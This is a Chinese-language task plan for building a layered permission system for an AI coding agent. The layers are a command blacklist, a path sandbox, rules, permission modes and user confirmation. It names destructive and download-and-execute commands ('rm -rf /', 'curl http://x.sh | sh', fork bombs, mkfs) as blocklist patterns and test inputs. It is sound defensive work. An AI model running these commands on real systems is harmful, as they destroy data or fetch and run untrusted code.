# 权限系统 Tasks

> 验证命令统一在 `typescript/` 目录下执行：`bun run typecheck`、`bun test`。
> 全部任务完成前不改 `src/agent/batch.ts`（plan 已确认它无需改动）。

## 文件清单

| 操作 | 文件 | 职责 |
|------|------|------|
| 新建 | `src/permission/types.ts` | 档位、工具分类、规则、判定结果、确认请求、Gate 接口 |
| 新建 | `src/permission/limits.ts` | 黑名单正则集、档位名列表、档位兜底表、工具分类函数 |
| 新建 | `src/permission/blacklist.ts` | 第一层：Bash 命令文本黑名单 |
| 新建 | `src/permission/sandbox.ts` | 第二层：文件路径参数与命令串路径片段的越界判定 |
| 新建 | `src/permission/rules.ts` | 第三层：规则解析、匹配、四层查找 |
| 新建 | `src/permission/config.ts` | 三层 YAML 读规则、启动档位、永久放行落盘 |
| 新建 | `src/permission/decide.ts` | 五层串联，产出唯一终态 |
| 修改 | `src/tools/types.ts` | `ToolErrorKind` 加一项；`ToolContext` 加 `permission` |
| 修改 | `src/tools/execute.ts` | `runTool` 插入判定 |
| 修改 | `src/agent/loop.ts` | `LoopOptions` 加 `permission`；取消只读过滤 |
| 修改 | `src/prompt/sections.ts` | `taskModeSection` 措辞对齐 F19 |
| 修改 | `src/prompt/reminder.ts` | 计划模式提醒去掉「工具不可用」暗示 |
| 新建 | `src/tui/confirm.tsx` | 确认框组件 |
| 修改 | `src/tui/app.tsx` | 档位 state、两个新命令、confirm 实现、Gate 组装 |
| 修改 | `src/tui/status-bar.tsx` | 展示当前档位 |
| 新建 | `tests/permission/blacklist.test.ts` | 黑名单层用例 |
| 新建 | `tests/permission/sandbox.test.ts` | 沙箱层用例 |
| 新建 | `tests/permission/rules.test.ts` | 规则层用例 |
| 新建 | `tests/permission/config.test.ts` | 配置加载与落盘用例 |
| 新建 | `tests/permission/decide.test.ts` | 五层串联与档位矩阵用例 |
| 修改 | `.gitignore` | 忽略 `.mewcode/config.local.yaml` |

## T1: 定义权限模块的类型

**文件：** `src/permission/types.ts`
**依赖：** 无
**步骤：**
1. 定义 `PermissionMode`，四个字面量：`"plan" | "default" | "acceptEdits" | "bypass"`。
2. 定义 `ToolClass`：`"read" | "write" | "bash"`。
3. 定义 `RuleSource`：`"session" | "local" | "project" | "user"`。
4. 定义 `Rule` 接口：`tool: string`、`pattern: string`、`effect: "allow" | "deny"`、`source: RuleSource`、`order: number`。
5. 定义 `RuleSet` 接口：`layers: Record<RuleSource, Rule[]>`，注明每层内部按 `order` 升序。
6. 定义 `DecisionLayer`：`"blacklist" | "sandbox" | "rule" | "mode" | "human"`。
7. 定义 `LayerVerdict`：`"allow" | "deny" | "ask" | "abstain"`，以及 `LayerResult`：`{ verdict: LayerVerdict; reason?: string }`。
8. 定义 `PermissionDecision` 判别联合：`{ verdict: "allow"; layer: DecisionLayer }` 与 `{ verdict: "deny"; layer: DecisionLayer; reason: string }`。
9. 定义 `ConfirmRequest`：`toolName: string`、`summary: string`、`ruleCandidate: string`。
10. 定义 `ConfirmChoice`：`"once" | "session" | "always" | "deny"`。
11. 定义 `PermissionGate` 接口：`mode: PermissionMode`、`rules: RuleSet`、可选 `confirm(request): Promise<ConfirmChoice>`、`grantSession(rule): void`、`grantAlways(rule): void`。
12. 注释写明「前两层只能产出 deny 或 abstain」这一约束的来由（spec N2）。

**验证：** `bun run typecheck` 通过。

## T2: 声明权限常量与工具分类

**文件：** `src/permission/limits.ts`
**依赖：** T1
**步骤：**
1. 导出 `DANGEROUS_PATTERNS: Array<{ pattern: RegExp; label: string }>`，覆盖这几类：根目录递归删除、设备写入（`dd`）、磁盘格式化（`mkfs`）、下载管道执行（`curl`/`wget` 接 `sh`/`bash`）、权限递归放开（`chmod -R 777 /`）、fork 炸弹、系统关机重启、磁盘分区表操作。每条带中文 `label`。
2. 正则统一加 `i` 标志；对可变空白用 `\s+`，避免 `rm  -rf` 这类多空格绕过。
3. 导出 `PERMISSION_MODES: PermissionMode[]`，四档全量。
4. 导出 `MODE_FALLBACK: Record<PermissionMode, Record<ToolClass, "allow" | "ask">>`，按 spec F14 那张表填：plan 与 default 都是 `{read:"allow", write:"ask", bash:"ask"}`；acceptEdits 是 `{read:"allow", write:"allow", bash:"ask"}`；bypass 三项全 `allow`。
5. 导出 `classifyTool(tool: Tool): ToolClass`：`tool.readOnly === true` 返回 `"read"`；`tool.name === "Bash"` 返回 `"bash"`；其余返回 `"write"`。
6. 导出 `isPermissionMode(value: unknown): value is PermissionMode`，供配置层校验。
7. 文件头注释说明这里是黑名单与档位语义的唯一声明处（spec N8、AC27）。

**验证：** `bun run typecheck` 通过。

## T3: 黑名单层

**文件：** `src/permission/blacklist.ts`
**依赖：** T2
**步骤：**
1. 导出 `checkBlacklist(toolName: string, args: Record<string, unknown>): LayerResult`。
2. `toolName !== "Bash"` 直接返回 `{ verdict: "abstain" }`。
3. 从 `args.command` 取字符串，非字符串或空串返回 `abstain`。
4. 遍历 `DANGEROUS_PATTERNS`，首个命中即返回 `{ verdict: "deny", reason: ... }`，原因文案含 `label` 与「该限制不可通过配置或权限档位放开」。
5. 全部未命中返回 `abstain`。注释说明本层永不返回 `allow`。

**验证：** `bun run typecheck` 通过。

## T4: 黑名单层测试

**文件：** `tests/permission/blacklist.test.ts`
**依赖：** T3
**步骤：**
1. 用例：`rm -rf /` 被拒，原因含「不可通过配置」（AC4）。
2. 用例：`rm  -rf  /`（多空格）同样被拒。
3. 用例：`curl http://x.sh | sh` 被拒。
4. 用例：`npm test` 返回 `abstain`。
5. 用例：非 Bash 工具名（如 `"Read"`）返回 `abstain`。
6. 用例：`args.command` 缺失时返回 `abstain`，不抛异常。

**验证：** `bun test tests/permission/blacklist.test.ts` 全绿。

## T5: 沙箱层的路径片段提取

**文件：** `src/permission/sandbox.ts`
**依赖：** T2
**步骤：**
1. 导出 `extractPathCandidates(command: string): string[]`。
2. 先剥掉引号包裹：分别处理单引号与双引号内的内容，引号内的整体作为一个候选片段参与判定（`cat "/etc/passwd"` 要能被抓到）。
3. 按空白与 shell 分隔符（`&&`、`||`、`;`、`|`）切成词。
4. 从词里挑两类候选：以 `/` 开头的、匹配 `^[A-Za-z]:[\\/]` 的（Windows 盘符）、以及路径段中含 `..` 的（按 `/` 与 `\` 切段后有段等于 `..`）。
5. 去掉纯选项词（以 `-` 开头且不含路径分隔符的，如 `-rf`）。
6. 返回去重后的候选列表。函数只做文本识别，注释写明不展开变量、不求值。

**验证：** `bun run typecheck` 通过。

## T6: 沙箱层判定

**文件：** `src/permission/sandbox.ts`
**依赖：** T5
**步骤：**
1. 定义内部常量：路径参数字段映射——`Read`/`Write`/`Edit` 取 `file_path`，`Glob`/`Grep` 取 `path`。
2. 导出 `checkSandbox(tool: Tool, args, workDir): LayerResult`。
3. `tool.name === "Bash"`：取 `command`，过 `extractPathCandidates`，逐个调 `resolveInside(workDir, candidate)`，首个 `ok === false` 即返回 `deny`，原因含该片段与「命令中的路径超出工作目录」。全部通过返回 `abstain`。
4. 其余工具：按字段映射取路径值；字段不存在或值为 `undefined`（如 `Glob` 未传 `path`）返回 `abstain`；有值则调 `resolveInside`，失败返回 `deny` 并带上 `resolveInside` 给的 `reason`。
5. 映射表里没有的工具名返回 `abstain`。
6. 注释说明本层与工具内部的 `resolveInside` 是有意重复（plan P4）。

**验证：** `bun run typecheck` 通过。

## T7: 沙箱层测试

**文件：** `tests/permission/sandbox.test.ts`
**依赖：** T6
**步骤：**
1. 用 `mkdtempSync` 建临时工作目录，`afterEach` 里 `rmSync` 清理，写法对齐 `tests/tools/paths.test.ts`。
2. 用例：`extractPathCandidates("cat /etc/passwd")` 含 `/etc/passwd`。
3. 用例：`extractPathCandidates("cd ../other && ls")` 含 `../other`。
4. 用例：`extractPathCandidates('cat "/etc/passwd"')` 能抓到引号内路径。
5. 用例：`extractPathCandidates("rm -rf dist")` 不把 `-rf` 当路径。
6. 用例：Bash `cat /etc/passwd` 被拒，`cd ../other && ls` 被拒，`npm test` 返回 `abstain`（AC7）。
7. 用例：`Write` 传目录外绝对路径被拒；传目录内尚不存在的新文件返回 `abstain`（AC6）。
8. 用例：指向目录外的符号链接被拒；建链接失败（权限不足）时直接 `return` 跳过，对齐 `paths.test.ts` 的处理。
9. 用例：`Glob` 不传 `path` 返回 `abstain`。

**验证：** `bun test tests/permission/sandbox.test.ts` 全绿。

## T8: 规则解析与匹配

**文件：** `src/permission/rules.ts`
**依赖：** T1
**步骤：**
1. 导出 `parseRule(text, effect, source, order): Rule | undefined`。取首个 `(` 与末个 `)`，中间为 `pattern`，前面为 `tool`；缺括号、`tool` 为空、`)` 不在末尾则返回 `undefined`。`tool` 与 `pattern` 都做 `trim`。
2. 内部实现 `globToRegExp(pattern: string): RegExp`：转义正则元字符，把 `*` 换成 `[\s\S]*`，整体锚定 `^...$`。注释说明 `*` 跨路径分隔符匹配（不做 `**` 与 `*` 的区分，spec 未要求）。
3. 内部实现 `subjectFor(toolName, args): string | undefined`：`Bash` 取 `command` 整串（F10）；`Read`/`Write`/`Edit` 取 `file_path`；`Glob`/`Grep` 取 `path`。取到后统一过 `toPosix` 归一化。
4. 导出 `matchRule(rule, toolName, args): boolean`：工具名不等返回 `false`；取 `subject`，`undefined` 返回 `false`；`pattern` 不含 `*` 时全等比较，含 `*` 时用 `globToRegExp` 测试。
5. 导出 `checkRules(rules: RuleSet, toolName, args): LayerResult`：按 `session → local → project → user` 顺序，每层内筛出全部命中项，取 `order` 最大的那条，按其 `effect` 返回 `allow` 或 `deny`（deny 原因含规则文本与来源层名）；该层有命中即返回，不看更低层；四层皆无命中返回 `abstain`。
6. 导出 `ruleTextFor(tool, args): string`：返回 `${tool.name}(${subject})`，`subject` 取不到时退回 `tool.name` 加空括号。注释说明这是精确整串、不泛化（F23）。

**验证：** `bun run typecheck` 通过。

## T9: 规则层测试

**文件：** `tests/permission/rules.test.ts`
**依赖：** T8
**步骤：**
1. 写一个构造 `RuleSet` 的小助手，接收各层的 `[effect, text]` 列表，内部调 `parseRule` 并按序号填 `order`。
2. 用例：`parseRule("Bash(git *)", ...)` 得到 `tool === "Bash"`、`pattern === "git *"`。
3. 用例：`parseRule("Bash(echo (x))", ...)` 的 `pattern` 是 `echo (x)`（末个右括号才算结束）。
4. 用例：`parseRule("Bash", ...)`、`parseRule("(x)", ...)` 返回 `undefined`。
5. 用例：`Bash(git *)` 命中 `git status`（AC9）。
6. 用例：`Bash(npm test)` 命中 `npm test`、不命中 `npm test --watch`（精确匹配）。
7. 用例：`Bash(git *)` 命中 `git status && mv src /tmp`（AC10，已知取舍）。
8. 用例：项目层 deny、本地层 allow 时结果 `allow`；本地层 deny、用户层 allow 时结果 `deny`（AC11）。
9. 用例：同层先 deny 后 allow 结果 `allow`，两条顺序调换后结果 `deny`（AC12）。
10. 用例：无任何规则时返回 `abstain`。
11. 用例：`ruleTextFor` 对 Bash 调用产出 `Bash(npm test)`。

**验证：** `bun test tests/permission/rules.test.ts` 全绿。

## T10: 配置加载

**文件：** `src/permission/config.ts`
**依赖：** T8
**步骤：**
1. 定义 `PermissionConfigResult`：`mode: PermissionMode`、`rules: RuleSet`、`warnings: string[]`。
2. 内部实现 `readLayer(filePath, source): { rules: Rule[]; warnings: string[] }`：文件不存在返回空；`readFileSync` 后用 `js-yaml` 的 `load` 解析；解析抛错则产出 warning 并返回空规则（N5，不静默放开）。
3. 取 `permissions` 字段，非数组则产出 warning 返回空。逐项处理：每项必须是单键对象且键为 `allow` 或 `deny`、值为字符串，否则产出 warning 跳过该项；合法项调 `parseRule`，返回 `undefined` 时产出 warning 跳过。`order` 按数组下标递增。
4. 导出 `loadPermissionConfig(cwd = process.cwd()): PermissionConfigResult`：按用户级 `~/.mewcode/config.yaml`、项目级 `${cwd}/.mewcode/config.yaml`、项目本地级 `${cwd}/.mewcode/config.local.yaml` 三个路径分别调 `readLayer`，填进 `RuleSet` 的对应桶，`session` 桶初始化为空数组。
5. 档位取值：从三个文件的 `permission_mode` 字段取，后读的覆盖先读的（与现有 `mergeConfig` 的覆盖方向一致）；全都没有取 `"default"`；取到的值过 `isPermissionMode`，不合法则用 `"default"` 并产出 warning 说明该值无效（F17、AC16）。
6. 导出 `appendLocalRule(rule: Rule, cwd = process.cwd()): void`：读 `${cwd}/.mewcode/config.local.yaml`（不存在视为空对象），把 `{ [rule.effect]: "Tool(pattern)" }` 追加到 `permissions` 数组尾部，用 `js-yaml` 的 `dump` 写回。目录不存在时先 `mkdirSync` 递归创建。追加到尾部即本层顺序最后、优先级最高（F13）。
7. 注释说明为何不复用 `src/config/config.ts` 的 `mergeConfig`（plan P5：合并会丢来源分层）。

**验证：** `bun run typecheck` 通过。

## T11: 配置层测试

**文件：** `tests/permission/config.test.ts`
**依赖：** T10
**步骤：**
1. 建临时目录当 `cwd`，在其中造 `.mewcode/` 与各层 YAML；`afterEach` 清理。
2. 用例：项目级写 `permissions: [{deny: "Bash(git push*)"}, {allow: "Bash(git *)"}]`，加载后 `project` 桶两条且 `order` 为 0、1。
3. 用例：`permission_mode: acceptEdits` 被读成对应档位。
4. 用例：`permission_mode: strict`（已废弃的档位名）退到 `"default"` 并有 warning（AC16）。
5. 用例：无 `permission_mode` 字段时为 `"default"`。
6. 用例：YAML 语法错误时产出 warning、规则为空、档位为 `"default"`，且不抛异常（AC26）。
7. 用例：`permissions` 项写成 `{allow: "Bash"}`（缺括号）时产出 warning 且跳过该项，其余项仍生效。
8. 用例：`appendLocalRule` 写入后重新 `loadPermissionConfig`，`local` 桶含该条规则（AC22）。
9. 用例：`.mewcode/` 目录不存在时 `appendLocalRule` 能创建目录并写入。
10. 用例：`appendLocalRule` 两次后，第二条的 `order` 大于第一条。
11. 注意：用例里传入的 `cwd` 必须是临时目录，避免污染仓库里真实的 `.mewcode/`。用户级路径指向 `homedir()`，测试中不写它，只断言不因缺失而报错。

**验证：** `bun test tests/permission/config.test.ts` 全绿；执行后 `git status` 不显示 `.mewcode/` 有改动。

## T12: 五层串联

**文件：** `src/permission/decide.ts`
**依赖：** T3、T6、T8
**步骤：**
1. 导出 `decide(tool, args, context): Promise<PermissionDecision>`。
2. 调 `checkBlacklist`，`deny` 则返回 `{ verdict: "deny", layer: "blacklist", reason }`。
3. 调 `checkSandbox`，`deny` 则返回 `layer: "sandbox"`。
4. `context.permission` 缺失时：跳过规则层，直接按 `MODE_FALLBACK["default"]` 查表，`allow` 返回放行、`ask` 返回拒绝（原因说明当前环境无法交互确认）。这条保证既有测试无需改造。
5. 有 `permission` 时调 `checkRules`，`allow` 返回 `layer: "rule"` 放行，`deny` 返回 `layer: "rule"` 拒绝。
6. 规则 `abstain` 时按 `MODE_FALLBACK[permission.mode][classifyTool(tool)]` 查表：`allow` 返回 `layer: "mode"` 放行；`ask` 进入第五层。
7. 第五层：`permission.confirm` 缺失则返回拒绝（原因说明无法交互）。存在则构造 `ConfirmRequest`（`summary` 用 `tool.callSummary(args)`，`ruleCandidate` 用 `ruleTextFor`）并 `await`；用 `try/catch` 包住，抛错按拒绝处理。
8. 按选择分支：`once` 直接放行；`session` 先 `grantSession(rule)` 再放行；`always` 先 `grantAlways(rule)` 再放行；`deny` 返回拒绝且原因用固定文案「用户拒绝了此操作」（F24）。`session`/`always` 构造的 `Rule` 的 `source` 分别为 `"session"`/`"local"`，`order` 取当前该层长度。
9. 四种拒绝的原因文案必须彼此可区分（N4、AC25）。

**验证：** `bun run typecheck` 通过。

## T13: 串联层测试

**文件：** `tests/permission/decide.test.ts`
**依赖：** T12
**步骤：**
1. 写构造 `PermissionGate` 的助手：接收档位、各层规则、可选 `confirm` 桩，`grantSession`/`grantAlways` 记录调用。
2. 用例：`rm -rf /` 在 bypass 档且配了 `allow: Bash(rm *)` 时仍被拒，`layer === "blacklist"`（AC5）。
3. 用例：目录外写入在 bypass 档仍被拒，`layer === "sandbox"`（AC8）。
4. 用例：黑名单命中时 `checkRules` 未被调用——用一个会抛异常的规则桩验证短路（AC2）。
5. 用例：配了 `deny` 规则后切 bypass 档仍被拒；配了 `allow` 规则后切 plan 档直接放行且 `confirm` 未被调用（AC14）。
6. 用例：四档 × 三类工具的兜底矩阵，逐格断言 `allow` 或触发 `confirm`（AC13）。
7. 用例：`confirm` 返回 `"once"` 时放行且 `grantSession`/`grantAlways` 均未被调用（AC20）。
8. 用例：返回 `"session"` 时 `grantSession` 被调用一次、`grantAlways` 未被调用（AC21）。
9. 用例：返回 `"always"` 时 `grantAlways` 被调用一次（AC22）。
10. 用例：返回 `"deny"` 时拒绝，原因为固定文案，`layer === "human"`（AC23）。
11. 用例：`confirm` 缺失时 `ask` 转拒绝；`context.permission` 整体缺失时读类工具放行、写类工具被拒。
12. 用例：`confirm` 抛异常时按拒绝处理，不向外抛。
13. 用例：四种拒绝的 `reason` 两两不相等（AC25）。

**验证：** `bun test tests/permission/decide.test.ts` 全绿。

## T14: 接入工具执行入口

**文件：** `src/tools/types.ts`、`src/tools/execute.ts`
**依赖：** T12
**步骤：**
1. `types.ts`：`ToolErrorKind` 联合加 `"permission_denied"`，带注释说明用途。
2. `types.ts`：`ToolContext` 加可选字段 `permission?: PermissionGate`，从 `../permission/types.js` 引入类型。
3. `execute.ts`：在 `validate` 成功之后、`tool.execute` 之前插入 `const decision = await decide(tool, validation.value, context);`。
4. 判定为 `deny` 时 `return fail("permission_denied", decision.reason)`，不进入 `try` 块（N1：工具不得产生任何副作用）。
5. 确认判定用的是 `validation.value` 而非原始 `args`，保证拿到的是归一化后的参数（plan P1）。

**验证：** `bun run typecheck` 通过；`bun test tests/tools/` 全绿（既有工具测试不传 `permission`，读类应照常通过、写类应被拒——若有既有写类测试因此失败，在 T15 统一处理）。

## T15: 修复既有测试中受影响的写类调用

**文件：** `tests/tools/write.test.ts`、`tests/tools/edit.test.ts`、`tests/tools/bash.test.ts`、`tests/agent/batch.test.ts`、`tests/agent/loop.test.ts`
**依赖：** T14
**步骤：**
1. 先跑 `bun test` 看哪些用例因新判定失败——只有直接走 `runTool` 且涉及写类工具的会失败，直接调 `tool.execute` 的不受影响。
2. 对失败的用例，在其 `ToolContext` 里补一个最小 `PermissionGate`：`mode: "bypass"`、空 `RuleSet`、`grantSession`/`grantAlways` 为空函数、不提供 `confirm`。
3. 抽一个共享助手放 `tests/permission/helpers.ts`（导出 `bypassGate()` 与 `emptyRuleSet()`），供上述测试与 T13 复用，避免每个文件各写一份。
4. 不改动这些测试的断言语义——只补上下文，不放宽预期。

**验证：** `bun test` 全绿。

## T16: 接入 Agent Loop

**文件：** `src/agent/loop.ts`
**依赖：** T14
**步骤：**
1. `LoopOptions` 加可选字段 `permission?: PermissionGate`。
2. 从 `options` 解构出 `permission`，传进 `runBatches` 的 context：`{ workDir, signal, permission }`。
3. 把 `registry.definitionsFor(protocol, { readOnlyOnly: mode === "plan" })` 改为 `registry.definitionsFor(protocol)`（F19：计划档下写类工具照常下发）。
4. 确认 `StopReason` 未新增取值（F3、AC3）。
5. `mode` 参数保留——它仍决定提示词侧的 `reminders`，只是不再决定工具下发范围。

**验证：** `bun run typecheck` 通过；`bun test tests/agent/loop.test.ts` 全绿（若有断言「计划模式下工具列表只含只读」的用例，改为断言含全部工具，对应 AC18）。

## T17: 提示词措辞对齐

**文件：** `src/prompt/sections.ts`、`src/prompt/reminder.ts`
**依赖：** 无
**步骤：**
1. `sections.ts` 的 `taskModeSection`：把「计划模式：只有只读工具可用」改成说明计划模式下全部工具可用、但修改文件与执行命令需用户逐次确认，用途仍是先调研出方案。
2. 同一 section 里「执行模式：全部工具可用」一句补上「按当前权限档位决定是否需要确认」。
3. `reminder.ts` 的 `PLAN_FULL`：保留「在用户明确批准之前，不要修改任何文件」这一行为要求（F18），删掉或改写任何暗示工具不可用的表述。
4. `reminder.ts` 的 `PLAN_BRIEF`：同样处理。
5. 不改 `PROMPT_PRIORITY`、不改 `ModeTracker` 的轮次逻辑。

**验证：** `bun test tests/prompt/` 全绿（若既有用例断言了旧措辞的关键词，同步更新为新措辞的关键词）。

## T18: 确认框组件

**文件：** `src/tui/confirm.tsx`
**依赖：** T1
**步骤：**
1. 组件签名：`ConfirmBox({ request, onChoose }: { request: ConfirmRequest; onChoose: (choice: ConfirmChoice) => void })`。
2. 四个选项按顺序：本次放行（`once`）、本会话放行（`session`）、永久放行（`always`）、拒绝（`deny`）。
3. 用 `useState` 存游标，`useInput` 处理 ↑/↓ 与 Enter，写法对齐 `src/tui/provider-select.tsx`。
4. 渲染内容：标题一行标明需要确认，一行显示 `request.summary`，选项逐行渲染并高亮当前项，末行提示「↑/↓ 选择，Enter 确认」。
5. 选中「永久放行」时额外显示一行说明将写入 `request.ruleCandidate`（让用户看清授权范围）。
6. 颜色与符号取自 `./styles.js` 的 `brand`、`symbols`，不引入新的样式常量。

**验证：** `bun run typecheck` 通过。

## T19: TUI 接入档位与确认

**文件：** `src/tui/app.tsx`
**依赖：** T10、T18、T16
**步骤：**
1. 启动时（组件顶层）调 `loadPermissionConfig()`，结果存 ref；`mode` 初始化 `permissionMode` state，`rules` 存进 `rulesRef`，`warnings` 在首个 effect 里以 system 消息呈现（N5）。
2. 新增 `pendingConfirm` state（`ConfirmRequest | null`）与 `confirmResolveRef`（存挂起的 resolve）。
3. 实现 `confirm(request)`：返回一个 Promise，把 `resolve` 存进 ref，`setPendingConfirm(request)`。
4. 实现 `handleConfirmChoice(choice)`：取出 ref 里的 resolve 调用、清空 ref、`setPendingConfirm(null)`。
5. 组装 `PermissionGate`：`mode` 取 `permissionMode` state，`rules` 取 `rulesRef.current`，`confirm` 用上面的实现，`grantSession(rule)` 把规则 push 进 `rulesRef.current.layers.session`，`grantAlways(rule)` 先调 `appendLocalRule(rule)` 再 push 进 `layers.local`（本进程立即生效，不重读文件，plan P11）。
6. `runLoop` 调用处传入 `permission: gate`。注意 gate 要每轮重新构造或用 ref 读取档位，避免闭包捕获旧档位（F16：切换立即对后续调用生效）。
7. `switchMode` 扩展为同时设置 `AgentMode` 与 `PermissionMode`：`/plan` → (`plan`, `plan`)；`/do` → (`execute`, `default`)；`/accept-edits` → (`execute`, `acceptEdits`)；`/bypass` → (`execute`, `bypass`)。
8. `handleSubmit` 加 `/accept-edits` 与 `/bypass` 两个分支，提示文案说明各档语义；`/bypass` 的提示里明确「黑名单与路径沙箱仍然生效」。
9. 渲染：`pendingConfirm` 非空时渲染 `<ConfirmBox>` 并让 `InputBox` 隐藏（或 `disabled`），避免两处同时吃键盘。
10. 顶层 `useInput` 的 Esc 分支：中断时若 `confirmResolveRef.current` 非空，先 `resolve("deny")` 再清空，避免 Promise 永久悬空（plan P12）。

**验证：** `bun run typecheck` 通过；`bun test` 全绿。

## T20: 状态栏展示档位

**文件：** `src/tui/status-bar.tsx`、`src/tui/app.tsx`
**依赖：** T19
**步骤：**
1. `StatusBar` 的 `mode` 属性改为接收权限档位的中文名（计划／默认／acceptEdits／放行），或新增一个属性并列展示，取决于现有布局宽度。
2. `app.tsx` 传值处同步更新——现在传的是 `mode === "plan" ? "计划" : "执行"`，改为按 `permissionMode` 映射。
3. 不改状态栏其余字段与布局结构。

**验证：** `bun run typecheck` 通过。

## T21: 本地配置不进版本库

**文件：** `.gitignore`（仓库根）
**依赖：** T10
**步骤：**
1. 追加一行 `.mewcode/config.local.yaml`，上方加注释说明它承载个人权限信任决定（N6）。
2. 检查该文件当前是否已被 git 跟踪：若已跟踪，只提示用户需要手动 `git rm --cached`，不代为执行（涉及版本库状态变更）。
3. 不动 `.mewcode/config.yaml` 的忽略状态——含真实密钥的配置文件是否入库是独立问题，spec 已明确划出本章范围。

**验证：** `git check-ignore -v .mewcode/config.local.yaml` 有输出（命中忽略规则）。

## T22: 端到端验证

**文件：** 无（只跑验证）
**依赖：** T1–T21
**步骤：**
1. `bun run typecheck` 全过。
2. `bun test` 全绿。
3. 在 tmux 里启动 MewCode，输入一句会触发写文件的请求，观察确认框出现、四个选项可选、选「本次放行」后文件被真正写入。
4. 切到 `/bypass`，重复同样请求，观察不再弹确认框。
5. 切回 `/do`，输入一句会触发 `rm -rf /` 的请求（或直接让模型执行该命令），观察被黑名单拒绝且模型收到失败结果后继续对话、未终止本轮。
6. 选一次「永久放行」，检查 `.mewcode/config.local.yaml` 新增了对应规则；重启后同样调用不再询问。
7. 执行完毕清理测试产生的临时文件与 `config.local.yaml` 里的测试规则。

**验证：** 上述每步的实际观察结果都与预期一致；不一致的先修再复跑。

## 执行顺序

```
T1 ──→ T2 ──→ T3 ──→ T4
        │
        ├──→ T5 ──→ T6 ──→ T7
        │
        └──→ T8 ──→ T9
                     │
                     └──→ T10 ──→ T11
                                   │
T3,T6,T8 ────────────────────────→ T12 ──→ T13
                                            │
                                            └──→ T14 ──→ T15 ──→ T16
                                                                  │
T1 ──→ T18 ─────────────────────────────────────────────────────→ T19 ──→ T20
                                                                  │
T17（可随时并行）─────────────────────────────────────────────────┤
T10 ──→ T21（可随时并行）─────────────────────────────────────────┤
                                                                  ▼
                                                                 T22
```

关键路径：T1 → T2 → T8 → T10 → T12 → T14 → T15 → T16 → T19 → T22。
T17（提示词措辞）与 T21（gitignore）不阻塞任何任务，可以插在任意空档。
